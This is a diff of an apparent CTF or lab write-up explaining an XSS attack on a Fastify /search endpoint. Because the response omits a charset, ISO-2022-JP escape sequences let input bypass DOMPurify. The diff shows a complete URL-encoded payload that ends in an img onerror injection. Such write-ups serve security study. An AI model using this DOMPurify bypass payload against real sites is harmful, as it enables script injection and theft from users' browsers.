@@ -520,22 +520,13 @@ fastify.get("/search", async (req, reply) => {
 });
 ```
 
-1. **Charset Manipulation Vulnerability**
-- The `/search` endpoint doesn't specify charset in Content-Type header
-- Uses DOMPurify for sanitization but vulnerable to encoding differentials
-
-2. **Attack Chain**
-```javascript
-const cleanQuery = DOMPurify.sanitize(query);
-reply.type("text/html").send(resp);
-```
-    
-3. **Exploitation Steps**
-- Insert ISO-2022-JP escape sequences (`\x1b$B` and `\x1b(B`)
-- Browser auto-detects ISO-2022-JP encoding due to escape sequences
-- DOMPurify sanitizes in UTF-8 but browser interprets as ISO-2022-JP
-- Characters are interpreted differently between sanitization and rendering
-- Allows XSS payload injection bypassing DOMPurify
+The web application uses DOMPurify to sanitize user input from the search parameter, but has a critical flaw in how it handles character encoding. 
+When a request is made to `/search`, the application doesn't explicitly set a character encoding in the Content-Type header. 
+This allows an attacker to manipulate how the browser interprets the text by inserting special `ISO-2022-JP` escape sequences (`\x1b$B` and `\x1b(B`).
+ While DOMPurify processes the input as *UTF-8* during sanitization, the browser can be tricked into interpreting the response as *ISO-2022-JP* due to these escape sequences. 
+ This encoding differential creates a gap where certain characters get processed differently between sanitization and rendering phases. 
+ 
+ As a result,we can craft a malicious payload that appears safe to DOMPurify when processed as UTF-8, but becomes dangerous javascript code when the browser interprets it as `ISO-2022-JP`.
 
 ```javascript
 <a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="><img%20src=x%20onerror=alert()%20></a>
